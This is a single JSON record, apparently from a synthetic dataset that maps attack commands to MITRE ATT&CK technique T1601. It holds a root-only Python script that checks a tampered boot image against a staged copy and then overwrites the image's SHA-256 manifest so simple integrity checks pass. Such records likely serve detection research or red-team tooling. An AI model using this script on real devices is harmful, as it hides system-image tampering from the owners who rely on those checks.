@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Python",
+  "command": "python3 - <<'PY'\nimport os, sys, hashlib, filecmp\nif os.geteuid() != 0:\n    sys.exit(\"root required\")\n\ndeployed = \"/boot/images/system_patched.img\"\nmanifest = \"/boot/images/system_patched.img.sha256\"\nstaged = \"/tmp/system_patched.img\"\n\nif not filecmp.cmp(deployed, staged, shallow=False):\n    sys.exit(\"deployed image does not match staged\")\n\nh = hashlib.sha256()\nwith open(deployed, \"rb\") as f:\n    for b in iter(lambda: f.read(1<<20), b\"\"):\n        h.update(b)\n\nopen(manifest, \"w\").write(h.hexdigest() + \"  \" + os.path.basename(deployed) + \"\\n\")\nprint(\"Updated checksum manifest:\", manifest)\nPY",
+  "explanation": "After deploying a modified image, recalculates and writes a matching SHA-256 manifest to align integrity files with the tampered image and evade simple verification.",
+  "rationale_steps": [
+    "Require root to write to boot image directories.",
+    "Verify the deployed image matches the staged tampered image using filecmp.",
+    "Generate a SHA-256 and overwrite the manifest file to legitimize the changed image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1601-0c03443f-c2702c7c",
+  "source_prompt_hash": "0c03443f",
+  "timestamp_utc": "2025-09-30T04:56:19.919567Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
